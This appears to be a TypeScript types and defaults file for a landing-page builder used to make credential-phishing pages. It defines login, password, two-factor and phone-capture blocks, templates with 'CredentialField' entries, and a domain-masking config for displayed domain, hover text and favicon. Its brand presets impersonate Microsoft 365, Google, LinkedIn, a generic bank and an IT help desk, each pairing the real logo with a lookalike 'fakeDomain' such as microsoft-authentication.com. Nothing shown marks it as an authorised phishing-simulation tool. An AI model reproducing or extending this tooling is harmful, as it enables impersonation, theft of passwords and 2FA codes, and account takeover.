// Landing Builder Types

export type BlockType =
  | 'header'
  | 'paragraph'
  | 'button'
  | 'input'
  | 'image'
  | 'divider'
  | 'spacer'
  | 'html'
  | 'loginForm'
  | 'passwordField'
  | 'twoFactorInput'
  | 'phoneInput'
  | 'formStep';

export interface Block {
  id: string;
  type: BlockType;
  props: Record<string, unknown>;
}

// New block types for LandingBuilder
export interface HeaderBlock {
  id: string;
  type: 'header';
  props: {
    content: string;
    level: 1 | 2 | 3 | 4;
    align: 'left' | 'center' | 'right';
    color: string;
    fontSize: number;
  };
}

export interface ParagraphBlock {
  id: string;
  type: 'paragraph';
  props: {
    content: string;
    align: 'left' | 'center' | 'right';
    color: string;
    fontSize: number;
    fontWeight: number;
  };
}

export interface ButtonBlock {
  id: string;
  type: 'button';
  props: {
    text: string;
    href: string;
    backgroundColor: string;
    color: string;
    borderRadius: number;
    paddingX: number;
    paddingY: number;
    align: 'left' | 'center' | 'right';
    fullWidth: boolean;
  };
}

export interface InputBlock {
  id: string;
  type: 'input';
  props: {
    label: string;
    name: string;
    type: 'text' | 'email' | 'password' | 'tel' | 'number';
    placeholder: string;
    required: boolean;
    autocomplete: string;
    width: string;
  };
}

export interface ImageBlock {
  id: string;
  type: 'image';
  props: {
    src: string;
    alt: string;
    width: string;
    height: string;
    href: string;
  };
}

export interface DividerBlock {
  id: string;
  type: 'divider';
  props: {
    color: string;
    thickness: number;
    width: string;
    style: 'solid' | 'dashed' | 'dotted';
  };
}

export interface SpacerBlock {
  id: string;
  type: 'spacer';
  props: {
    height: number;
  };
}

export interface HtmlBlock {
  id: string;
  type: 'html';
  props: {
    content: string;
  };
}

// Form block types
export interface LoginFormBlock {
  id: string;
  type: 'loginForm';
  props: {
    usernameLabel: string;
    usernamePlaceholder: string;
    usernameName: string;
    passwordLabel: string;
    passwordPlaceholder: string;
    passwordName: string;
    showRememberMe: boolean;
    showForgotPassword: boolean;
    submitText: string;
    width: string;
  };
}

export interface PasswordFieldBlock {
  id: string;
  type: 'passwordField';
  props: {
    label: string;
    name: string;
    placeholder: string;
    required: boolean;
    showStrengthMeter: boolean;
    width: string;
  };
}

export interface TwoFactorInputBlock {
  id: string;
  type: 'twoFactorInput';
  props: {
    label: string;
    name: string;
    placeholder: string;
    required: boolean;
    codeLength: number;
    width: string;
  };
}

export interface PhoneInputBlock {
  id: string;
  type: 'phoneInput';
  props: {
    label: string;
    name: string;
    placeholder: string;
    required: boolean;
    defaultCountryCode: string;
    showCountrySelect: boolean;
    width: string;
  };
}

// Multi-step form support
export interface FormStep {
  id: string;
  type: 'formStep';
  props: {
    title: string;
    description: string;
    blocks: Block[];
  };
}

export interface LandingTemplate {
  id: string;
  name: string;
  category: 'banco' | 'rh' | 'ti' | 'gov' | 'ecommerce';
  description: string;
  target_audience: string;
  colorScheme: {
    primary: string;
    secondary: string;
    accent: string;
    background: string;
    text: string;
  };
  fields: CredentialField[];
  branding: {
    logo?: string;
    companyName: string;
    fakeDomain: string;
  };
  content: {
    headline: string;
    subheadline: string;
    body: string;
    ctaText: string;
    footerText: string;
  };
  elements: LandingElement[];
  // Multi-step support
  steps?: FormStep[];
}

export interface CredentialField {
  id: string;
  label: string;
  name: string;
  type: 'text' | 'email' | 'password' | 'select';
  placeholder: string;
  required: boolean;
  options?: { value: string; label: string }[];
  autocomplete?: string;
}

export interface LandingElement {
  type: 'image' | 'icon' | 'divider' | 'alert' | 'timer' | 'badge';
  props: Record<string, string | boolean | number>;
}

export interface DomainMaskConfig {
  enabled: boolean;
  displayDomain: string;
  hoverText: string;
  useFavicon: boolean;
  faviconUrl?: string;
}

// CSS Variables for landing page theming
export interface LandingCssVariables {
  '--lp-primary-color': string;
  '--lp-bg-color': string;
  '--lp-text-color': string;
  '--lp-logo-url': string;
  '--lp-border-radius': string;
  '--lp-accent-color': string;
  '--lp-secondary-color': string;
}

// Brand presets
export type BrandPreset =
  | 'microsoft'
  | 'google'
  | 'banco'
  | 'itHelpDesk'
  | 'linkedin';

export interface BrandPresetConfig {
  id: BrandPreset;
  name: string;
  primaryColor: string;
  backgroundColor: string;
  textColor: string;
  accentColor: string;
  logoUrl: string;
  fakeDomain: string;
  companyName: string;
}

export const BRAND_PRESETS: Record<BrandPreset, BrandPresetConfig> = {
  microsoft: {
    id: 'microsoft',
    name: 'Microsoft 365',
    primaryColor: '#0078d4',
    backgroundColor: '#f3f3f3',
    textColor: '#323130',
    accentColor: '#0078d4',
    logoUrl: 'https://www.microsoft.com/favicon.ico',
    fakeDomain: 'microsoft-authentication.com',
    companyName: 'Microsoft 365',
  },
  google: {
    id: 'google',
    name: 'Google',
    primaryColor: '#4285f4',
    backgroundColor: '#ffffff',
    textColor: '#202124',
    accentColor: '#1a73e8',
    logoUrl: 'https://www.google.com/favicon.ico',
    fakeDomain: 'google-accounts-secure.com',
    companyName: 'Google',
  },
  banco: {
    id: 'banco',
    name: 'Banco Genérico',
    primaryColor: '#1a5f7a',
    backgroundColor: '#f5f5f5',
    textColor: '#1a1a1a',
    accentColor: '#159895',
    logoUrl: '',
    fakeDomain: 'secure-bank-portal.com',
    companyName: 'Banco Genérico',
  },
  itHelpDesk: {
    id: 'itHelpDesk',
    name: 'IT Help Desk',
    primaryColor: '#0066cc',
    backgroundColor: '#f8f8f8',
    textColor: '#333333',
    accentColor: '#ff6600',
    logoUrl: '',
    fakeDomain: 'it-support-reset.com',
    companyName: 'IT Help Desk',
  },
  linkedin: {
    id: 'linkedin',
    name: 'LinkedIn',
    primaryColor: '#0077b5',
    backgroundColor: '#ffffff',
    textColor: '#000000',
    accentColor: '#00a0dc',
    logoUrl: 'https://www.linkedin.com/favicon.ico',
    fakeDomain: 'linkedin-secure-login.com',
    companyName: 'LinkedIn',
  },
};

export interface BuilderState {
  template: LandingTemplate | null;
  customizations: {
    primaryColor: string;
    secondaryColor: string;
    logoUrl: string;
    companyName: string;
    fakeDomain: string;
  };
  domainMask: DomainMaskConfig;
  previewMode: 'desktop' | 'mobile';
  // New: CSS Variables per landing page
  cssVariables: LandingCssVariables;
  // New: Block editing
  blocks: Block[];
  selectedBlockId: string | null;
  // New: Multi-step form
  currentStep: number;
  totalSteps: number;
}

export interface DeployResult {
  success: boolean;
  url?: string;
  error?: string;
  deploymentId?: string;
}

// Utility functions
export function generateBlockId(): string {
  return `block_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
}

export function defaultHeaderBlock(id: string): HeaderBlock {
  return {
    id,
    type: 'header',
    props: {
      content: 'Heading',
      level: 2,
      align: 'center',
      color: '#ffffff',
      fontSize: 24,
    },
  };
}

export function defaultParagraphBlock(id: string): ParagraphBlock {
  return {
    id,
    type: 'paragraph',
    props: {
      content: 'Enter your text here...',
      align: 'left',
      color: '#9ca3af',
      fontSize: 14,
      fontWeight: 400,
    },
  };
}

export function defaultButtonBlock(id: string): ButtonBlock {
  return {
    id,
    type: 'button',
    props: {
      text: 'Click Me',
      href: '#',
      backgroundColor: '#f59e0b',
      color: '#000000',
      borderRadius: 8,
      paddingX: 24,
      paddingY: 12,
      align: 'center',
      fullWidth: false,
    },
  };
}

export function defaultInputBlock(id: string): InputBlock {
  return {
    id,
    type: 'input',
    props: {
      label: 'Input Label',
      name: 'input_field',
      type: 'text',
      placeholder: 'Enter value...',
      required: false,
      autocomplete: 'off',
      width: '100%',
    },
  };
}

export function defaultImageBlock(id: string): ImageBlock {
  return {
    id,
    type: 'image',
    props: {
      src: '',
      alt: 'Image',
      width: '100%',
      height: '200px',
      href: '',
    },
  };
}

export function defaultDividerBlock(id: string): DividerBlock {
  return {
    id,
    type: 'divider',
    props: {
      color: '#374151',
      thickness: 1,
      width: '100%',
      style: 'solid',
    },
  };
}

export function defaultSpacerBlock(id: string): SpacerBlock {
  return {
    id,
    type: 'spacer',
    props: {
      height: 40,
    },
  };
}

export function defaultHtmlBlock(id: string): HtmlBlock {
  return {
    id,
    type: 'html',
    props: {
      content: '<div>Custom HTML</div>',
    },
  };
}

export function defaultLoginFormBlock(id: string): LoginFormBlock {
  return {
    id,
    type: 'loginForm',
    props: {
      usernameLabel: 'Username',
      usernamePlaceholder: 'Enter your username',
      usernameName: 'username',
      passwordLabel: 'Password',
      passwordPlaceholder: 'Enter your password',
      passwordName: 'password',
      showRememberMe: true,
      showForgotPassword: true,
      submitText: 'Sign In',
      width: '100%',
    },
  };
}

export function defaultPasswordFieldBlock(id: string): PasswordFieldBlock {
  return {
    id,
    type: 'passwordField',
    props: {
      label: 'Password',
      name: 'password',
      placeholder: 'Enter password',
      required: true,
      showStrengthMeter: false,
      width: '100%',
    },
  };
}

export function defaultTwoFactorInputBlock(id: string): TwoFactorInputBlock {
  return {
    id,
    type: 'twoFactorInput',
    props: {
      label: 'Verification Code',
      name: '2fa_code',
      placeholder: '000000',
      required: true,
      codeLength: 6,
      width: '200px',
    },
  };
}

export function defaultPhoneInputBlock(id: string): PhoneInputBlock {
  return {
    id,
    type: 'phoneInput',
    props: {
      label: 'Phone Number',
      name: 'phone',
      placeholder: '(555) 123-4567',
      required: false,
      defaultCountryCode: '+1',
      showCountrySelect: true,
      width: '100%',
    },
  };
}

export function defaultFormStep(id: string): FormStep {
  return {
    id,
    type: 'formStep',
    props: {
      title: 'Step Title',
      description: 'Step description',
      blocks: [],
    },
  };
}